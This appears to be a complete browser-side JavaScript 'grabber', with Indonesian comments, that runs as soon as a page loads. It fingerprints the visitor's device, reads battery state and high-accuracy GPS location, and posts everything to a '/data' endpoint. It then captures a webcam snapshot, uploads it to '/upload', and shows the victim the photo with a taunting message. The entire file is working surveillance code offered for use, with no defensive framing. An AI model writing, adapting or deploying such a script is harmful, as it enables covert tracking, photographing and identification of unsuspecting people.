(async function() {
  async function getBatteryInfo() {
    if ('getBattery' in navigator) {
      try {
        const battery = await navigator.getBattery();
        return {
          level: `${Math.round(battery.level * 100)}%`,
          charging: battery.charging
        };
      } catch {
        return null;
      }
    }
    return null;
  }

  function getLocationInfo() {
    return new Promise(resolve => {
      if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            resolve({
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              accuracy: pos.coords.accuracy
            });
          },
          () => resolve(null),
          { enableHighAccuracy: true, timeout: 7000 }
        );
      } else {
        resolve(null);
      }
    });
  }

  function getClientInfo() {
    return {
      userAgent: navigator.userAgent || null,
      language: navigator.language || null,
      platform: navigator.platform || null,
      memory: navigator.deviceMemory || null,
      cores: navigator.hardwareConcurrency || null,
      screen: {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth
      },
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      referrer: document.referrer || null
    };
  }

  async function sendData(payload) {
    try {
      await fetch("/data", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      });
    } catch (err) {
      console.error("[X] Gagal kirim data:", err);
    }
  }

  const data = getClientInfo();
  data.battery = await getBatteryInfo();
  data.location = await getLocationInfo();
  data.timestamp = new Date().toISOString();

  await sendData(data);

  // Fitur kamera otomatis
  async function captureAndSendPhoto() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      await new Promise(resolve => video.onloadedmetadata = resolve);
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);
      stream.getTracks().forEach(track => track.stop());
      canvas.toBlob(async blob => {
        const formData = new FormData();
        formData.append('photo', blob, 'snapshot.jpg');
        await fetch('/upload', {
          method: 'POST',
          body: formData
        });
        // Tampilkan popup card dengan foto dan pesan
        const imgUrl = URL.createObjectURL(blob);
        const popup = document.createElement('div');
        popup.style.position = 'fixed';
        popup.style.top = '50%';
        popup.style.left = '50%';
        popup.style.transform = 'translate(-50%, -50%)';
        popup.style.backgroundColor = 'white';
        popup.style.border = '1px solid #ccc';
        popup.style.padding = '20px';
        popup.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
        popup.style.zIndex = '1000';
        popup.style.textAlign = 'center';
        popup.innerHTML = `
          <img src="${imgUrl}" style="max-width: 300px; max-height: 300px; border: 1px solid #ddd;" />
          <p>Ku Tangkap Kau Bajingan!!!</p>
          <button onclick="this.parentElement.remove()">Tutup</button>
        `;
        document.body.appendChild(popup);
      });
    } catch (err) {
      console.error('Error accessing camera:', err);
    }
  }

  await captureAndSendPhoto();
})();
